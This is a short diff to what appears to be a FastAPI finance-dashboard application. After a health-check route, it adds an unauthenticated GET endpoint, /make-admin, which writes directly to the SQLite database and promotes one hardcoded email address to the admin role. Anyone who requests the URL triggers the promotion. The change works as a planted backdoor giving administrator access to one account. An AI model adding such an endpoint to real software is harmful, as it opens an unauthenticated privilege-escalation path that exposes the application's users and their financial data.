@@ -43,3 +43,21 @@ app.include_router(api_router, prefix=settings.api_v1_prefix)
 )
 def health_check() -> HealthResponse:
     return HealthResponse(status="ok", service=settings.app_name)
+
+
+@app.get("/make-admin")
+def make_admin():
+    import sqlite3
+
+    conn = sqlite3.connect("finance_dashboard.db")
+    cursor = conn.cursor()
+
+    cursor.execute(
+        "UPDATE users SET role = 'admin' WHERE email = ?",
+        ("abhi123@gmail.com",),
+    )
+
+    conn.commit()
+    conn.close()
+
+    return {"message": "User is now admin"}
